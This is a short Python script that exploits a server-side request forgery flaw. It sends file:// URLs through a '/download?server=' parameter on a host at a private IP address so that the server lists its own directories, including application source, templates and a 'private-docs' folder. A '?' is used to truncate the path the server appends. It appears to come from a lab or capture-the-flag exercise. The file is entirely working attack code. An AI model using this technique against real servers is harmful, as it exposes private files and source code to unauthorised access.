"""List directories via file:// SSRF with pycurl."""
import requests

T = "http://10.82.168.213"

# pycurl can list directories with file:// protocol
dirs = [
    "/usr/src/app/",
    "/usr/src/app/static/",
    "/usr/src/app/templates/",
    "/usr/src/app/public-docs/",
    "/usr/src/app/private-docs/",
    "/usr/src/",
    "/usr/src/app/static/imgs/",
]

print("[*] Listing directories via file:// SSRF...")
for d in dirs:
    # Using ? to truncate the appended path
    url = f"{T}/download?server=file://{d}?&id=1"
    try:
        r = requests.get(url, timeout=8)
        if r.status_code == 200 and len(r.content) > 0:
            text = r.content.decode(errors="replace")
            if "Werkzeug" not in text:
                print(f"\n[FOUND] {d} ({len(r.content)} bytes)")
                print(text[:1000])
            else:
                # Check error message
                import re
                err = re.findall(r"title>([^<]+)<", text)
                if err:
                    print(f"\n[ERROR] {d}: {err[0]}")
    except Exception as e:
        print(f"\n[EXC] {d}: {e}")
